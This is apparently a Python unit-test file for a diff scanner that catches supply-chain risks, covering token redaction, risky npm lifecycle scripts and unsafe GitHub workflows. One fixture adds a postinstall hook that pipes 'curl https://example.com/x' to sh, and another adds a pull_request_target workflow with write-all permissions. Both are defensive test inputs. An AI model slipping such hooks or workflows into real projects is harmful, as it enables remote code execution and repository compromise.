import argparse
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

import zt_slop  # noqa: E402


class Chdir:
    def __init__(self, path):
        self.path = path
        self.old = None

    def __enter__(self):
        self.old = os.getcwd()
        os.chdir(self.path)

    def __exit__(self, exc_type, exc, tb):
        os.chdir(self.old)


def run(cmd, cwd):
    subprocess.run(cmd, cwd=cwd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)


class ZtSlopTests(unittest.TestCase):
    def test_redacts_known_tokens(self):
        text = "token='ghp_abcdefghijklmnopqrstuvwxyzABCDE12345'"
        redacted = zt_slop.redact(text)
        self.assertIn("REDACTED", redacted)
        self.assertNotIn("abcdefghijklmnopqrstuvwxyz", redacted)

    def test_lifecycle_script_blocks(self):
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            run(["git", "init"], repo)
            run(["git", "config", "user.email", "test@example.com"], repo)
            run(["git", "config", "user.name", "Test"], repo)
            (repo / "package.json").write_text(json.dumps({"name": "demo", "version": "1.0.0"}) + "\n")
            run(["git", "add", "package.json"], repo)
            run(["git", "commit", "-m", "base"], repo)
            base = subprocess.check_output(["git", "rev-parse", "HEAD"], cwd=repo, text=True).strip()

            (repo / "package.json").write_text(
                json.dumps(
                    {
                        "name": "demo",
                        "version": "1.0.0",
                        "scripts": {"postinstall": "curl https://example.com/x | sh"},
                    },
                    indent=2,
                )
                + "\n"
            )
            run(["git", "add", "package.json"], repo)
            run(["git", "commit", "-m", "add postinstall"], repo)
            head = subprocess.check_output(["git", "rev-parse", "HEAD"], cwd=repo, text=True).strip()

            args = argparse.Namespace(
                base=base,
                head=head,
                config="missing.json",
                no_network=True,
                json_report="report.json",
                markdown_report="report.md",
                sarif_report="report.sarif",
                fail_on="block",
            )
            with Chdir(repo):
                findings, _elapsed = zt_slop.scan(args)
            self.assertTrue(any(f.rule_id == "package_json.lifecycle_script" and f.severity == "block" for f in findings))
            self.assertTrue(any(f.rule_id == "package_json.lifecycle_network_or_shell" and f.severity == "block" for f in findings))

    def test_workflow_pull_request_target_blocks(self):
        diff = """diff --git a/.github/workflows/release.yml b/.github/workflows/release.yml
index 0000000..1111111 100644
--- a/.github/workflows/release.yml
+++ b/.github/workflows/release.yml
@@ -0,0 +1,4 @@
+name: release
+on: pull_request_target
+permissions: write-all
+jobs: {}
"""
        files = zt_slop.parse_diff(diff)
        findings = []
        zt_slop.analyze_workflows(files, findings, zt_slop.DEFAULT_CONFIG)
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("workflow.pull_request_target", rule_ids)
        self.assertIn("workflow.write_all_permissions", rule_ids)


if __name__ == "__main__":
    unittest.main()
